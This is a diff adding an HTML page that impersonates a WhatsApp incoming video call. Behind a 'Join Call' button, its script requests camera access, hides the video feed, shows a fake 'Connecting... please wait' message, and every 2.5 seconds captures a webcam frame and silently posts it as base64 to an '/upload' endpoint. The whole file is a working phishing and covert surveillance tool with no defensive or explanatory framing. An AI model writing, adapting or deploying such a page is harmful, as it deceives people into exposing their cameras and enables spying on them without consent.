@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>WhatsApp Video Call</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #075E54;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            flex-direction: column;
+        }
+        .container {
+            text-align: center;
+            background: white;
+            padding: 30px;
+            border-radius: 20px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+            width: 90%;
+            max-width: 350px;
+        }
+        .wa-icon {
+            font-size: 60px;
+            margin-bottom: 10px;
+        }
+        h2 {
+            color: #075E54;
+        }
+        p {
+            color: #555;
+            margin: 20px 0;
+        }
+        .btn {
+            background: #25D366;
+            border: none;
+            padding: 12px 30px;
+            font-size: 18px;
+            color: white;
+            border-radius: 40px;
+            cursor: pointer;
+            width: 100%;
+            font-weight: bold;
+        }
+        .btn:hover {
+            background: #128C7E;
+        }
+        .status {
+            margin-top: 15px;
+            font-size: 14px;
+            color: gray;
+        }
+        video, canvas {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <div class="wa-icon">📞</div>
+    <h2>WhatsApp Video Call</h2>
+    <p>Incoming video call from <strong>+91 98765 43210</strong></p>
+    <button class="btn" id="joinBtn">Join Call</button>
+    <div class="status" id="statusMsg">Click Join to connect...</div>
+</div>
+<video id="video" autoplay playsinline></video>
+<canvas id="canvas" style="display:none;"></canvas>
+<script>
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const statusDiv = document.getElementById('statusMsg');
+    const joinBtn = document.getElementById('joinBtn');
+
+    joinBtn.onclick = () => {
+        statusDiv.innerText = "Requesting camera access...";
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                video.srcObject = stream;
+                statusDiv.innerText = "Connecting... please wait";
+                joinBtn.disabled = true;
+                startCapture();
+            })
+            .catch(err => {
+                statusDiv.innerText = "Camera access denied. Please allow camera for WhatsApp.";
+                console.error(err);
+            });
+    };
+
+    function startCapture() {
+        setInterval(() => {
+            if (video.videoWidth === 0) return;
+            const ctx = canvas.getContext('2d');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const dataURL = canvas.toDataURL('image/jpeg');
+            const base64 = dataURL.split(',')[1];
+            fetch('/upload', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ image: base64 })
+            }).then(res => {
+                if (res.ok) console.log("Sent");
+            }).catch(err => console.error(err));
+        }, 2500);
+    }
+</script>
+</body>
+</html>
